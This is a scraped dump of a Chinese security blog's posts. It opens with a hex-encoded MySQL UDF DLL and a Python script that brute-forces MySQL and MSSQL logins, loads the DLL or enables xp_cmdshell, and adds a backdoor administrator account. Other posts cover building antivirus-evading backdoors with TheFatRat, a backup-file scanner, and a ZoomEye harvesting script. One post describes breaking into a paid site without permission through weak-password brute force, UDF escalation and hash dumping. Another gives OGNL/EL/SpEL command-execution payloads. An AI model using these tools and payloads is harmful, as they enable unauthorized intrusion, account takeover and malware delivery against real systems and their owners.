72653D2278383622207075626C69634B6579546F6B656E3D2231666338623362396131653138653362223E3C2F617373656D626C794964656E746974793E0D0A202020203C2F646570656E64656E74417373656D626C793E0D0A20203C2F646570656E64656E63793E0D0A3C2F617373656D626C793E504100000000000000000000000010830000F08200000000000000000000000000001D83000008830000000000000000000000000000000000000000000028830000368300004683000056830000648300000000000072830000000000004B45524E454C33322E444C4C004D5356435239302E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C467265650000006672656500000000000000004AFE9F5A0000000058840000010000001200000012000000A4830000EC8300003484000021100000A312000000100000A4120000A3120000A0120000CC110000A31200009811000086110000A31200009811000076100000A3120000431000002E1100001A110000A91000006D84000083840000A0840000BB840000C7840000DA840000EB840000F484000004850000128500001B8500002B8500003985000041850000508500005D850000658500007485000000000100020003000400050006000700080009000A000B000C000D000E000F00100011006C69625F6D7973716C7564665F7379732E646C6C006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F62696E6576616C007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F6576616C007379735F6576616C5F6465696E6974007379735F6576616C5F696E6974007379735F65786563007379735F657865635F6465696E6974007379735F657865635F696E6974007379735F676574007379735F6765745F6465696E6974007379735F6765745F696E6974007379735F736574007379735F7365745F6465696E6974007379735F7365745F696E69740000000000700000100000006D3C683E6C3E0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;) if (data[0][0] &lt; 5) or ((data[0][0] == 5) and (data[0][2] &lt;= 1)): try: basedir = &quot;select &#39;%s&#39; into dumpfile &#39;c:\\\\windows\\\\system32\\\\udf.dll&#39;;&quot; %udf cursor.execute(basedir) cursor.execute(&quot;create function sys_eval returns string soname &#39;udf.dll&#39;;&quot;) cursor.execute(&quot;select cmdshell(&#39;net user wait wait /add&#39;);&quot;) cursor.execute(&quot;select cmdshell(&#39;net localgroup administrators wait /add&#39;);&quot;) with open(&quot;mysql.txt&quot;, &#39;a&#39;) as fs: fs.write(queue + u&quot;:3306 账号密码为 root/%s, 远程桌面账号密码为 wait/wait&quot;+&#39;\\n&#39;) % mm print queue + u&quot; udf 创建成功生成远程账号密码为：wait/wait&quot; except: print u&quot;udf执行失败&quot; else: try: cursor.execute(&quot;select @@basedir;&quot;) dir = cursor.fetchone() basedir1 = &quot;select &#39;plugin&#39; into dumpfile &#39;%s&#39;;&quot; %(dir[0]+&quot;lib/plugin::$INDEX_ALLOCATION&quot;) basedir2 = &quot;select &#39;%s&#39; into dumpfile &#39;%s&#39;;&quot; %(udf, dir[0]+&quot;lib/plugin/udf.dll&quot;) cursor.execute(basedir1) cursor.execute(basedir2) cursor.execute(&quot;create function sys_eval returns string soname &#39;udf.dll&#39;;&quot;) cursor.execute(&quot;select cmdshell(&#39;net user wait wait /add&#39;);&quot;) cursor.execute(&quot;select cmdshell(&#39;net localgroup administrators wait /add&#39;);&quot;) with open(&quot;mysql.txt&quot;, &#39;a&#39;) as fs: fs.write(queue + u&quot;:3306 账号密码为 root/%s, 远程桌面账号密码为 wait/wait&quot;+&#39;\\n&#39;) % mm print queue + u&quot; udf 创建成功生成远程账号密码为：wait/wait&quot; except: print u&quot;udf执行失败&quot; db.close() break except: continue def mssql(self,queue): with open(&#39;mm.txt&#39;,&#39;r&#39;) as f: file = f.readlines() for mm in file: try: db = pymssql.connect(host=queue, user=&quot;sa&quot;, password=mm.strip(&#39;\\n&#39;), database=&quot;master&quot;, connect_timeout=2) print u&quot;爆破%s:1433端口成功，账号密码为: sa/%s&quot; %(queue, mm.strip(&#39;\\n&#39;)) cursor = db.cursor() try: cursor.execute(&quot;exec master..xp_cmdshell &#39;whoami&#39;;&quot;) except: cursor.execute(&quot;EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;&quot;) try: cursor.execute(&quot;exec master..xp_cmdshell &#39;net user wait wait /add&#39;;&quot;) cursor.execute(&quot;exec master..xp_cmdshell &#39;net user administrators wait /add&#39;;&quot;) with open(&quot;mssql.txt&quot;,&#39;a&#39;) as fs: fs.write(queue+&quot;:1433 账号密码为 sa/%s, 远程桌面账号密码为 wait/wait&quot;+&#39;\\n&#39;) % mm.strip(&#39;\\n&#39;) except: print queue + u&quot; xp_cmdshell 执行失败&quot; db.close() except: continue def main(): queue = Queue.Queue() threads = [] with open(&quot;ip.txt&quot;) as f: file = f.readlines() for i in file: ip = i.strip(&#39;\\n&#39;) for x in IPy.IP(ip): queue.put(x) for i in xrange(1): threads.append(thread(queue)) for i in threads: i.start() for i in threads: i.join() if name == “main“: main() `","categories":[],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"基于scrapy的备份文件扫描","slug":"基于scrapy的备份文件扫描","date":"2018-09-27T02:51:38.000Z","updated":"2018-09-27T03:12:06.941Z","comments":true,"path":"2018/09/基于scrapy的备份文件扫描/","link":"","permalink":"/2018/09/基于scrapy的备份文件扫描/","excerpt":"","text":"Scrapy，Python开发的一个快速、高层次的屏幕抓取和web抓取框架，用于抓取web站点并从页面中提取结构化的数据。Scrapy用途广泛，可以用于数据挖掘、监测和自动测试。 首先生成项目文件 scrapy startproject spiderdata 生成成功后，会有以下目录结构，首先在spiderdata中的spider目录创建我们的spider文件。 备份文件扫描文件名，有两个选择，一是基于字典，二是根据url的备份文件名，从以往发现备份文件的结果上看，两种方式都是经常存在使用的。 于是创建backup文件，用来生成备份文件名，创建一个列表用来存储字典文件名，另外创建一个方法用来基于url生成备份文件名。 #coding:utf-8 import urlparse class backup(object): def __init__(self, url): self.url = url self.list2 = [&#39;/db.zip&#39;, &#39;/fdsa.rar&#39;, &#39;/ftp.rar&#39;, &#39;/gg.rar&#39;, &#39;/hdocs.rar&#39;, &#39;/hdocs.zip&#39;, &#39;/a.zip&#39;, &#39;/web.zip&#39;, &#39;/web.rar&#39;, &#39;/1.rar&#39;, &#39;/bbs.rar&#39;, &#39;/www.root.rar&#39;, &#39;/123.rar&#39;, &#39;/data.rar&#39;, &#39;/bak.rar&#39;, &#39;/oa.rar&#39;, &#39;/admin.rar&#39;, &#39;/www.rar&#39;, &#39;/2014.rar&#39;, &#39;/2015.rar&#39;, &#39;/2016.rar&#39;, &#39;/2014.zip&#39;, &#39;/2015.zip&#39;, &#39;/2016.zip&#39;, &#39;/2017.zip&#39;, &#39;/1.zip&#39;, &#39;/1.gz&#39;, &#39;/1.tar.gz&#39;, &#39;/2.zip&#39;, &#39;/2.rar&#39;, &#39;/123.rar&#39;, &#39;/123.zip&#39;, &#39;/a.rar&#39;, &#39;/a.zip&#39;, &#39;/admin.rar&#39;, &#39;/back.rar&#39;, &#39;/backup.rar&#39;, &#39;/bak.rar&#39;, &#39;/bbs.rar&#39;, &#39;/bbs.zip&#39;, &#39;/beifen.rar&#39;, &#39;/beifen.zip&#39;, &#39;/beian.rar&#39;, &#39;/data.rar&#39;, &#39;/data.zip&#39;, &#39;/HYTop.rar&#39;, &#39;/root.rar&#39;, &#39;/Release.rar&#39;, &#39;/Release.zip&#39;, &#39;/sql.rar&#39;, &#39;/test.rar&#39;, &#39;/template.rar&#39;, &#39;/template.zip&#39;, &#39;/upfile.rar&#39;, &#39;/vip.rar&#39;, &#39;/wangzhan.rar&#39;, &#39;/wangzhan.zip&#39;, &#39;/web.rar&#39;, &#39;/web.zip&#39;, &#39;/website.rar&#39;, &#39;/www.rar&#39;, &#39;/www.zip&#39;, &#39;/wwwroot.rar&#39;, &#39;/wwwroot.zip&#39;, &#39;/wz.rar&#39;] def backup(self): list_a = [] parse = urlparse.urlparse(self.url) name = parse.netloc.split(&#39;.&#39;) name_url = parse.netloc.replace(&#39;.&#39;, &#39;&#39;) for i in [&#39;.rar&#39;, &#39;.zip&#39;, &#39;.tar.gz&#39;, &#39;.7z&#39;]: list_a.append(parse.scheme + &#39;://&#39; + parse.netloc + &#39;/&#39; + parse.netloc + i) #http://www.baidu.com/www.baidu.com.zip if &#39;www&#39; in name: list_a.append(self.url + &#39;/&#39; + name[1] + i) #http://www.baidu.com/baidu.zip list_a.append(self.url + &#39;/&#39; + &#39;&#39;.join(name[1:]) + i) #http://www.baidu.com/baiducom.zip else: list_a.append(self.url + &#39;/&#39; + name[0] + i) #http://www.baidu.com/baidu.zip list_a.append(self.url + &#39;/&#39; + name_url + i) #http://www.baidu.com/wwwbaiducom.zip for x in self.list2: list_a.append(self.url + x) return list_a 在spider的爬虫文件中使用以下代码 #coding:utf-8 import scrapy from backup import backup from ..items import SpiderdateItem class spiderdata(scrapy.Spider): name = &quot;spiderdata&quot; content_type = [&#39;application/x-rar&#39;,&#39;application/x-gzip&#39;,&#39;application/zip&#39;,&#39;application/octet-stream&#39;,&#39;application/x-7z-compressed&#39;] def start_requests(self): with open(&#39;ip.txt&#39;,&#39;r&#39;) as f: for i in f.readlines(): ip = i.strip(&#39;\\n&#39;) back = backup(ip) url_ip = back.backup() for x in url_ip: yield scrapy.Request(x, callback=self.parse,dont_filter=True) def parse(self, response): item = SpiderdateItem() if response.headers[&#39;Content-Type&#39;] in self.content_type: print &quot;[&quot; + str(response.status) + &quot;]&quot; + u&#39; 检测到存在备份文件的URL: &#39;+ response.url item[&#39;url&#39;] = response.url yield item 调用之前创建的备份文件名函数，使用start_requests来生成一个可迭代对象。 数据通过item来保存本地，所以在items中创建一个参数，并且在settings中开启item管道。 url = scrapy.Field() 在piplines中创建本地文件保存文件，创建一次文件对象，写入后根据 爬虫关闭后再关闭本地文件。 def __init__(self): self.f = open(&quot;url.txt&quot;,&#39;w&#39;) def process_item(self, item, spider): self.f.write(item[&#39;url&#39;].encode(&quot;utf-8&quot;)+&#39;\\n&#39;) return item def close_spider(self, spider): self.f.close() 因此只需在spiderdata中创建ip.txt文件即可，写入需要检测的url，另外如果不想看到scrapy的log输出，可以用在setting中添加如下： LOG_LEVEL = &#39;WARNING&#39; 只显示warning级的log输出.","categories":[],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"使用docker创建镜像","slug":"使用docker创建镜像","date":"2018-09-25T06:40:17.000Z","updated":"2018-09-27T02:44:04.358Z","comments":true,"path":"2018/09/使用docker创建镜像/","link":"","permalink":"/2018/09/使用docker创建镜像/","excerpt":"","text":"在测试以及开源工具使用中，docker的便捷越来越成为快速部署的选择，那我们怎么构建自己的docker镜像。 构建Docker镜像有以下两种方法： 使用docker commit命令。 使用docker build命令和 Dockerfile 文件 docker commit命令首先我们在本地拉取ubuntu镜像作为基础的镜像环境。 如果我们在拉取的ubuntu镜像上安装 nginx，使用 docker run -it 镜像名 /bin/bash 这样进入需要修改的镜像内部。 首先按照一般操作步骤， apt-get update apt-get -y install nginx 等待构建结束后，使用exit退出，保存镜像，避免镜像内容丢失。 docker commit 修改的镜像id 用户名/仓库名 结束后便构建了一个设定好的镜像，如下所示。 如果需要上传镜像仓库，在https://hub.docker.com/注册登陆创建仓库即可，然后使用docker login登陆，此处使用的是命令行参数直接登陆。 执行：docker push 用户名/仓库名:标签 在hub.docker上就可以看到镜像信息了： 如需运行构建的docker docker run -d -p 80 --name web_web misakiyui/web nginx -g &quot;daemon off;&quot; –name: 容器名 nginx -g “daemon off;” 表示在镜像内运行的命令，在前台开启一个nginx进程 访问映射端口32768则可以看到安装的nginx了。 Dockerfile使用docker commit现在已经不推荐，推荐使用更为灵活的Dockerfile来构建镜像，如下Dockerfile，同样是在ubuntu下构建nginx FROM ubuntu:18.04 MAINTAINER misaki RUN apt-get update &amp;&amp; apt-get -y install nginx RUN echo &quot;hello world&quot; &gt; /var/www/html/index.nginx-debian.html EXPOSE 80 新建目录web，此目录就是构建环境目录。在Dockerfile中写入如下命令，FROM指构建环境，这里选用ubuntu 18.04版本，必须为第一行信息，注意这里都要小写，MAINTAINER指作者信息，RUN指在构建环境中需要运行的命令，每一个RUN都意味着建立一层，层数过多增加构建部署时间，也容易出错，所以尽量使用&amp;&amp;，在一层中构建命令。EXPOSE指应用程序使用容器的指定端口，设为80。也就是Dockerfile其实就是安装的每一条命令都写在一个文件内，这样运行后，程序自动的执行安装更新配置等等。 运行 docker run -t=&quot;misakiyui/web&quot; . (点是必须的)开始构建镜像 构建完成后再docker images中便可以看到设定的镜像了 运行 docker run -d -p 80 --name web_web misakiyui/web nginx -g &quot;daemon off;&quot; 开启镜像 这时候查看映射到本地的端口docker ps，本地映射32772端口，访问后就可以看到修改的信息和nginx了 。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"关于Thefatrat免杀使用","slug":"关于Thefatrat免杀使用","date":"2018-09-20T03:07:18.000Z","updated":"2018-09-20T05:18:56.082Z","comments":true,"path":"2018/09/关于Thefatrat免杀使用/","link":"","permalink":"/2018/09/关于Thefatrat免杀使用/","excerpt":"","text":"最近尝试了免杀工具thefatrat，记录一些使用过程和坑： 常见的免杀方式一般是：文件免杀方法和内存免杀方法 文件免杀指：加壳、加花等。内存免杀指：修改内存特征码、修改字符串等。 推荐一篇博文：http://anhkgg.com/aanti-virus/ 下面就记录thefatrat的使用和杀软查杀结果：采用在线查杀https://www.virustotal.com和http://www.virscan.org/language/zh-cn/ thefatrat的项目地址为：https://github.com/screetsec/thefatrat 安装步骤为： git clone https://github.com/Screetsec/TheFatRat.git cd TheFatRat chmod +x setup.sh &amp;&amp; ./setup.sh 安装后，建议查看logs文件夹下的fudwin文件,记录了安装使用中的存在的问题，比如使用中会出现There was an error creating your FUD rat with Powerstager 这种错误，查看fudwin文件，可以看到py2没有安装names模块，安装后正常使用。 再给以下文件权限 chmod + x fatrat chmod + x powerfull.sh ./fatrat 启动界面 第一项：利用msf生产后门，基本没免杀效果 第二项 ：利用powerstager混淆，从结果来看效果不错 第三项和第四项使用中报错和不能选择的问题，尚不得知问题原因，后续更新 第五项：生成apk后门 第六项：这个就是可以创建bat后门，但是里面还有c#编译和c编译等，但是被查杀率极高 第七项：生成office类后门 第八项：生成Linux后门 此次针对windows系统，下面用第二项的fudwin，进入后 使用第一项，第二项不确定是不是编码原因，全是乱码，选择后可以看到提示的本地IP和公网IP 执行完成后，在output文件夹下生成制定的exe文件，中间会选择图标 利用https://www.virustotal.com查看下效果如何，从结果上看不是很优秀，不过比较意外的是，360居然没查杀，国内几家免费杀软都没识别 尝试使用http://www.virscan.org/检查文件 结果更少，只有四个查杀(不确定是不是引擎版本问题) 从两个结果看 两边能查杀的国内杀软就江民杀毒，F-Secure在VirusTotal可以查杀，在VirSCAN没有查杀 运行文件查看是否能正常执行获得shell。 运行后用msf做监听，可以看到收到了shell thefatrat比较出众的一点就是可以生成bat后门文件，选择Create Fud Backdoor 1000% with PwnWinds 在程序output文件夹下的bat上传到 https://www.virustotal.com 被360查杀，但是能过江民，F-Secure，和国内其他家杀软 同样用msf监听执行情况，可以收到shell 以上文件在电脑管家和火绒环境下，静态查毒或者运行都不查杀。 在采用Create Fud 100% Backdoor with Fudwin 1.0中的Powerstager 0.2.5 by z0noxz (powershell)生成exe文件，再用upx加壳 Upx -7 aaa.exe 这个结果还算是能看，能查杀基本完全脱离国内杀软了 不过值得一提的就是上午电脑管家还不能查杀，下午就全国联保了，应该是上传可疑文件云端检测了，不过既然没有查杀也没有报可疑，为什么会上传检测，倒是一个问题。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"zoomeye接口实现","slug":"zoomeye接口实现","date":"2018-09-18T04:44:29.000Z","updated":"2018-09-20T04:35:56.085Z","comments":true,"path":"2018/09/zoomeye接口实现/","link":"","permalink":"/2018/09/zoomeye接口实现/","excerpt":"","text":"zoomeye的接口网上不少人做过实现，之前在学python的json信息处理，便写了这个一个利用脚本，唯一的坑就是wiki和返回信息不一样，浪费了点时间。没有多少难度，就是写了不少提示符，用来多次和提示输入。 #coding:utf-8 #author:misaki import requests import json import re def geturl(): app = raw_input(&#39;app:&#39;) app2 = input(&#39;page:&#39;) app3 = raw_input(&#39;country:&#39;) for i in xrange(1,app2+1): i=str(i) url=&#39;https://api.zoomeye.org/web/search?query=app:&#39;+app+&#39;&amp;page=&#39;+i+&#39;&amp;country=&#39;+app3 r2=requests.get(url,headers=headers) soup = r2.text a=json.loads(soup) #获取site for i in a[&#39;matches&#39;]: f=open(app+&#39;.txt&#39;,&#39;a&#39;) f.write(str(i[&#39;site&#39;])+&#39;\\n&#39;) f.close print &#39;All url number: %s&#39; % len(open(r&quot;web.txt&quot;, &#39;rU&#39;).readlines()) print &#39;\\r&#39; zoom = raw_input(&#39;Are you continue?[y/n]:&#39;) print &#39;\\r&#39; while zoom not in [&#39;y&#39;,&#39;n&#39;,&#39;Y&#39;,&#39;N&#39;]: print &quot;Please enter the specified letter!&quot; zoom = raw_input(&#39;Are you continue?[y/n]:&#39;) print &#39;\\r&#39; if zoom in [&#39;y&#39;,&#39;Y&#39;]: main() def getip(): app4 = raw_input(&#39;app:&#39;) app5 = input(&#39;page:&#39;) app6 = raw_input(&#39;country:&#39;) for i in xrange(1, app5 + 1): i = str(i) url = &#39;https://api.zoomeye.org/host/search?query=&#39; + app4 + &#39;&amp;page=&#39; + i +&#39;&amp;country=&#39; + app6 r2 = requests.get(url, headers=headers) parrten = re.compile(r&#39;(?&lt;![\\.\\d])(?:\\d{1,3}\\.){3}\\d{1,3}(?![\\.\\d])&#39;) #获取ip ip = parrten.findall(str(r2.text)) for i in ip: f = open(app4+&#39;.txt&#39;, &#39;a&#39;) f.write(str(i) + &#39;\\n&#39;) f.close print &#39;All url number: %s&#39; % len(open(r&quot;host.txt&quot;, &#39;rU&#39;).readlines()) print &#39;\\r&#39; zoom = raw_input(&#39;Are you continue?[y/n]:&#39;) while zoom not in [&#39;y&#39;,&#39;n&#39;,&#39;Y&#39;,&#39;N&#39;]: print &quot;Please enter the specified letter!&quot; zoom = raw_input(&#39;Are you continue?[y/n]:&#39;) print &#39;\\r&#39; if zoom in [&#39;y&#39;,&#39;Y&#39;]: main() def getuser(): url = &#39;https://api.zoomeye.org/resources-info&#39; r2 = requests.get(url, headers=headers) soup = json.loads(r2.text) print &#39;\\r&#39; print &#39;plan: %s&#39; %soup[&#39;plan&#39;] print &#39;search_num: %s&#39; %soup[&#39;resources&#39;][&#39;search&#39;] print &#39;stats: %s&#39; %soup[&#39;resources&#39;][&#39;stats&#39;] def main(): print &#39;Input service number&#39; print &#39;1 - web_search&#39; print &#39;2 - host_search&#39; print &#39;3 - resources_info&#39; name = raw_input(&#39;input num:&#39;) print &#39;\\r&#39; while name not in [&#39;1&#39;,&#39;2&#39;,&#39;3&#39;]: name = raw_input(&#39;input num:&#39;) if name != &#39;&#39;: try: if name == &#39;1&#39;: geturl() elif name == &#39;2&#39;: getip() elif name == &#39;3&#39;: getuser() except: pass if __name__==&#39;__main__&#39;: print &#39;#######&#39; print &#39; # #### #### # # ###### # # ######&#39; print &#39; # # # # # ## ## # # # # &#39; print &#39; # # # # # # ## # ##### # ##### &#39; print &#39; # # # # # # # # # # &#39; print &#39; # # # # # # # # # # &#39; print &#39;####### #### #### # # ###### # ######&#39; print &#39;auther:misaki&#39; print &#39;\\r&#39; print &#39;Input your username and password&#39; username = raw_input(&#39;username:&#39;) password = raw_input(&#39;password:&#39;) print &#39;\\r&#39; if username and password != -1: data = {&quot;username&quot;: username, &quot;password&quot;: password} s = json.dumps(data, indent=4) r = requests.post(&#39;https://api.zoomeye.org/user/login&#39;, data=s) if r.status_code == 200: token = r.text headers = {&#39;Authorization&#39;: &#39;JWT&#39; + &#39; &#39; + token[18:-2]} main() else: print &#39;Incorrect username or password&#39; ​​","categories":[],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"对意外发现的某站点测试","slug":"对意外发现的某站点测试","date":"2018-09-18T04:43:59.000Z","updated":"2018-09-20T04:37:09.019Z","comments":true,"path":"2018/09/对意外发现的某站点测试/","link":"","permalink":"/2018/09/对意外发现的某站点测试/","excerpt":"","text":"朋友分享一个站点，点开需要购买点卡，本着节约的原则，简单做了一个测试，于是便有了下文 爆破宝塔系统，页面提示三次错误将出现验证码，那么如何记录错误次数，猜测是通过cookie，删除cookie 弱口令爆破成功，进入宝塔后台 从宝塔后台获取phpmyadmin，root权限 同样可以看到文件系统，但只能看到网站目录，宝塔系统提示，从宝塔建站，默认user权限 上传shell，同样是只能看到当前网站目录 考虑通过phpmyadmin提权，发现系统禁止root外连，虽然没有必要，但还是尝试开启外连，用navicat连接数据库接管，用户中找到root用户，编辑权限，开启任意主机链接 采用udf提权，提权的话需要写入导出权限，但是由于权限设置不能导入导出 因为mysql对通过文件导入导出作了限制，默认不允许。默认value值为null，则为禁止，如果有文件夹目录，则只允许改目录下文件 通常操作为以下步骤，但是没有写权限，有了上传权限更方便操作，直接跳过udf导出步骤： Udf需要导出到\\lib\\plugin目录，一般该目录不存在\\lib\\plugin目录。 可以尝试利用NTFS ADS创建 plugin目录 查询 select &#39;xxx&#39; into dumpfile &#39;C:\\\\MySQL\\\\lib::$INDEX_ALLOCATION&#39;; 导出UDF.DLL 随便选一个库 查询 CREATE TABLE Temp_udf(udf BLOB); 查询 INSERT into Temp_udf values (CONVERT($shellcode,CHAR)); 查询 SELECT udf FROM Temp_udf INTO DUMPFILE &#39;C:\\\\MySQL\\\\lib\\\\plugin\\\\udf.dll&#39;;-- 查询 Create function cmdshell returns string soname &#39;udf.dll&#39;; 查询 select * from mysql.func; 查询 select cmdshell(&#39;net user test test /add&#39;); ​ 手动创建plugin目录，上传udf.dll文件，执行以上sql代码，创建账号，拿下服务器 利用Cve-2018-8120创建账号完成添加管理员 导出hash，利用Pwdump7 这个过程遇到一个问题就是，菜刀下模拟终端无法使用，目录只能看到网站目录，导致一段时间内以为是权限问题，而磁盘下的目录又只是一个网站目录，加深这种认识，拿下服务器的时候才发现是想多了，只有那一个目录。。。","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"/tags/渗透测试/"}]},{"title":"表达式注入","slug":"表达式注入","date":"2018-09-18T04:29:45.000Z","updated":"2018-09-20T04:36:56.198Z","comments":true,"path":"2018/09/表达式注入/","link":"","permalink":"/2018/09/表达式注入/","excerpt":"","text":"在一次项目中发现了一个泛微的历史老洞，而且是表达式注入中典型的一种，特地收集了相关资料做一份表达式注入的文档和记录 表达式注入概念：2013年4月15日Expression Language Injection词条在OWASP上被创建，而这个词的最早出现可以追溯到2012年12月的《Remote-Code-with-Expression-Language-Injection》一文，在这个paper中第一次提到了这个名词。 而这个时期，只不过还只是把它叫做远程代码执行漏洞、远程命令执行漏洞或者上下文操控漏洞。像Struts2系列的s2-003、s2-009、s2-016等，这种由OGNL表达式引起的命令执行漏洞。 流行的表达式语言：Struts2——OGNL实至名归的“漏洞之王”，表达式的格式: ​ @[类全名（包括包路径）]@[方法名 | 值名]，例如： ​ @java.lang.String@format(&#39;foo %s&#39;, &#39;bar&#39;) 基本用法： java ActionContext AC = ActionContext.getContext(); Map Parameters = (Map)AC.getParameters(); String expression = &quot;${(new java.lang.ProcessBuilder(&#39;calc&#39;)).start()}&quot;; AC.getValueStack().findValue(expression)); 相关漏洞： s2-009、s2-012、s2-013、s2-014、s2-015、s2-016，s2-017 Spring——SPELSPEL即Spring EL，故名思议是Spring框架专有的EL表达式。相对于其他几种表达式语言，使用面相对较窄，但是从Spring框架被使用的广泛性来看，还是有值得研究的价值的。 基本用法： 在jsp页面中可以使用el表达式代替&lt;%=%&gt;，之间访问java对象。 java String expression = &quot;T(java.lang.Runtime).getRuntime().exec(/&quot;calc/&quot;)&quot;; String result = parser.parseExpression(expression).getValue().toString(); JSP——JSTL_EL这种表达式是JSP语言自带的表达式，也就是说所有的Java Web服务都必然会支持这种表达式。但是由于各家对其实现的不同，也导致某些漏洞可以在一些Java Web服务中成功利用，而在有的服务中则是无法利用。 基本用法： jsp &lt;spring:message text=&quot;${/&quot;/&quot;.getClass().forName(/&quot;java.lang.Runtime/&quot;).getMethod(/&quot;getRuntime/&quot;,null).invoke(null,null).exec(/&quot;calc/&quot;,null).toString()}&quot;&gt; &lt;/spring:message&gt; Elasticsearch——MVELElasticsearch的CVE-2014-3120这个漏洞 MVEL是同OGNL和SPEL一样，具有通过表达式执行Java代码的强大功能。 基本用法： java import org.mvel.MVEL; public class MVELTest { ​ public static void main(String[] args) { ​ String expression = &quot;new java.lang.ProcessBuilder(/&quot;calc/&quot;).start();&quot;; ​ Boolean result = (Boolean) MVEL.eval(expression, vars); ​ } } 执行代码：OGNL表达式注入：示例：泛微E-Mobile 表达式获取数据语法：”${标识符}”，但在这个中并不需要${}来包括，不然会执行失败。 先用一个小的加减乘除做验证： 执行exp语句，执行命令whoami， @org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27whoami%27).getInputStream())： 尝试报路径，但此例并不成功 %24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D EL表达式注入：​ 实例：CVE-2011-2730 EL表达式语句在执行时，会调用pageContext.findAttribute方法，用标识符为关键字，分别从page、request、session、application四个域中查找相应的对象，找到则返回相应对象，找不到则返回”” （注意，不是null，而是空字符串）。 EL表达式可以很轻松获取JavaBean的属性，或获取数组、Collection、Map类型集合的数据 EL表达式语言中定义了11个隐含对象，使用这些隐含对象可以很方便地获取web开发中的一些常见对象，并读取这些对象的数据。 语法：${隐式对象名称}：获得对象的引用 序号 隐含对象名称 描述 1 pageContext 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。） 2 pageScope 代表page域中用于保存属性的Map对象 3 requestScope 代表request域中用于保存属性的Map对象 4 sessionScope 代表session域中用于保存属性的Map对象 5 applicationScope 代表application域中用于保存属性的Map对象 6 param 表示一个保存了所有请求参数的Map对象 7 paramValues 表示一个保存了所有请求参数的Map对象，它对于某个请求参数，返回的是一个string[] 8 header 表示一个保存了所有http请求头字段的Map对象，注意：如果头里面有“-” ，例Accept-Encoding，则要header[“Accept-Encoding”] 9 headerValues 表示一个保存了所有http请求头字段的Map对象，它对于某个请求参数，返回的是一个string[]数组。注意：如果头里面有“-” ，例Accept-Encoding，则要headerValues[“Accept-Encoding”] 10 cookie 表示一个保存了所有cookie的Map对象 11 initParam 表示一个保存了所有web应用初始化参数的map对象 语法：${运算表达式}，EL表达式支持如下运算符： 1、关系运算符 2、逻辑运算符： 3、empty运算符：检查对象是否为null(空) 4、二元表达式：${user!=null?user.name :””} 5、[ ] 和 . 号运算符 执行exp语句： ${pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;命令&quot;).getInputStream())} Primefaces框架表达式注入:Primefaces要加密Payload后执行命令，所以这里用打包成jar包的加密函数进行加密! 命令：java -cp .\\de.jar test.EncodeDecode exp 验证(代码): ${facesContext.getExternalContext().getResponse().getWriter().println(&quot;~~~elinject~~~&quot;)}${facesContext.getExternalContext().getResponse().getWriter().flush()}${facesContext.getExternalContext().getResponse().getWriter().close()} 加密的Payload: uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkV9XxzneUPyMM8BUxgtfxF3wYMlt0MXkqO5+OpbBXfBSKlTh7gJWI1HR5e/f4ZjcLzobfbDkQghTWQVAXvhdUc8D7M8Nnr+gSpk0we/YPtcrOOmI+/uuxl31mfOtFvEWGE3AUZFGxpmyfyMuGL0rzVw3wUpjUlHw4k3O4pm1RrCJT/PxEtCs00U9EBM2okSaAdPIn9p9G5X3lwi6lN7MXvoBhoFVy+31JzmoVeaZattVJhqvZRs1fguZGDCqQaJe+c6rQmcZWEKQg== Web路径: ${facesContext.getExternalContext().getResponse().getWriter().println(request.getSession().getServletContext().getRealPath(/&quot;//&quot;))}${facesContext.getExternalContext().getResponse().getWriter().flush()}${facesContext.getExternalContext().getResponse().getWriter().close()} 加密的Payload: uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkV9XxzneUPyMM8BUxgtfxF3wYMlt0MXkqO5%2BOpbBXfBSCSkb2z5x8Cb2P%2FDS2BUn7odA0GflWHV%2B9J8uLGYIqPK9HY85O%2BJw0u5X9urorJfQZKJihsLCV%2BnqyXHs8i6uh4iIboLA2TZUiTbjc3SfybUTvPCjRdyT6rCe6MPQGqHYkBiX3K7fGPuwJ2XNONXI9N2Sup5MWcUUo87FbX3jESvOq2Bs3sDKU4bW3aCGbhUcA2ZEgSxkLcW6VKDnXV5hxvz6J4a4E6P8HCy9v8%2BdrRzmtKbwczXk%2B9n8Lm2KYS%2Fk2TJKpeKjPg0t%2BAiKzTiqak%3D 反射式调用执行命令: 